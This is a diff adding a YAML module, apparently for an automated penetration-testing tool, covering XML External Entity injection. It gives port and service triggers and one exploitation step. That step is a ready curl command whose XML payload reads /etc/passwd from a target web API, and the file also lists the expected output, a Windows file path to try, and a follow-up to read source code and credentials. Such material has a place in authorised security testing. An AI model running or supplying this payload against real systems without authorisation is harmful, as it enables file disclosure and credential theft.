@@ -1,0 +1,34 @@
+id: xxe
+name: XML External Entity (XXE) Injection
+category: web
+description: Methodology for XML External Entity (XXE) vulnerabilities in XML parsers. Covers reading local system files, PHP source filter wrappers, and blind out-of-band DTD exfiltration.
+port_triggers:
+  - 80
+  - 443
+  - 8000
+  - 8080
+  - 8443
+  - 8978
+service_triggers:
+  - http
+  - https
+  - web
+tags:
+  - xxe
+  - xml
+  - file-disclosure
+  - web
+steps:
+  - id: xxe-file-read
+    title: Classic Local File Disclosure (XXE)
+    phase: exploitation
+    purpose: Define an external entity referencing `file:///etc/passwd` to display system file contents in the HTTP response.
+    command: 'curl -s -X POST -H "Content-Type: application/xml" -d ''<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM "file:///etc/passwd">]><root><name>&test;</name></root>'' "{{TARGET_URL}}/api/xml"'
+    expected_output:
+      - <root><name>root:x:0:0:root:/root:/bin/bash...</name></root>
+    common_mistakes:
+      - On Windows targets, query `file:///c:/windows/system32/drivers/etc/hosts`.
+    if_success: System files disclosed! Read application source code and credentials.
+    if_failure: Response does not reflect entity value. Test Blind Out-of-Band XXE.
+    references:
+      - https://portswigger.net/web-security/xxe
